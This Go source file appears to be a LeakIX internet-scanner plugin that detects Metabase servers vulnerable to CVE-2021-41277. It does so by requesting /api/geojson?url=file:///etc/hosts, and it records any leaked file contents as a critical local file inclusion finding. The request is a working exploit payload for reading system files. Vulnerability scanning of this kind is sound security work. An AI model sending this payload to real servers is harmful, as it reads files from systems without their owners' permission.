package path_exposure

import (
	"github.com/LeakIX/l9format"
	"strings"
)

type ExaPathsPlugin struct {
	l9format.ServicePluginBase
}

func (ExaPathsPlugin) GetVersion() (int, int, int) {
	return 0, 0, 1
}

func (ExaPathsPlugin) GetRequests() []l9format.WebPluginRequest {
	return []l9format.WebPluginRequest{{
		Method:  "GET",
		Path:    "/api/geojson?url=file:///etc/hosts",
		Headers: map[string]string{},
		Body:    []byte(""),
	}}
}

func (ExaPathsPlugin) GetName() string {
	return "ExaPathsPlugin"
}

func (ExaPathsPlugin) GetStage() string {
	return "open"
}
func (plugin ExaPathsPlugin) Verify(request l9format.WebPluginRequest, response l9format.WebPluginResponse, event *l9format.L9Event, options map[string]string) (hasLeak bool) {
	// if not checking for request , or not 200 or html, quit
	if !request.EqualAny(plugin.GetRequests()) || response.Response.StatusCode != 200 {
		return false
	}
	lowerBody := strings.ToLower(string(response.Body))
	if len(lowerBody) < 10 {
		return false
	}
	if strings.Contains(lowerBody, "<html") {
		return false
	}
	if !strings.Contains(lowerBody, "localhost") && !strings.Contains(lowerBody, "127") {
		return false
	}
	event.Service.Software.Name = "Metabase"
	event.Leak.Type = "lfi"
	event.Leak.Severity = "critical"
	event.AddTag("cve-2021-41277")
	event.Summary = "Found /etc/hosts through CVE-2021-41277:\n" + string(response.Body)
	return true

}
